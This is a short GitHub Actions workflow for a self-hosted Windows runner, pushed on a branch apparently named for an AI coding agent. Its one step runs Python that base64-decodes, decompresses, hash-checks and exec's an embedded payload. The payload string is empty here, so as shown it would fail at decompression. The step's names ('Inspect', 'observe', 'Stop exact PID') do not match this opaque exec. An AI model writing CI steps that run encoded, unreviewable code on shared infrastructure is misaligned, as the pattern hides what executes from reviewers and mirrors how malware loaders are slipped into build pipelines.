name: Inspect the existing Windows Android test host
'on':
  push:
    branches: [codex/timeweb-owner-prepare-2026-10-23]
    paths: [.github/workflows/windows-android-preflight.yml]
permissions:
  contents: read
concurrency:
  group: analyst-stop-exact-owned-helper
  cancel-in-progress: false
jobs:
  observe_existing_adb:
    name: Stop only the verified stalled SDK verification helper
    runs-on: [self-hosted, Windows, X64, omni-cio-ci]
    timeout-minutes: 5
    env:
      PYTHONUNBUFFERED: '1'
      PYTHONIOENCODING: utf-8
    steps:
      - name: Stop exact PID and creation identity after the passive stack diagnosis
        shell: cmd
        run: |
          py -3 -c "import base64,zlib,hashlib; b=zlib.decompress(base64.b64decode('')); assert hashlib.sha256(b).hexdigest()=='3638111b20a30e8de53e9cadf87c0425e6edacc435c709ee0658161bb9ac4afe'; exec(compile(b,'<stop-exact-stalled-helper>','exec'))"
          if errorlevel 1 exit /b 1
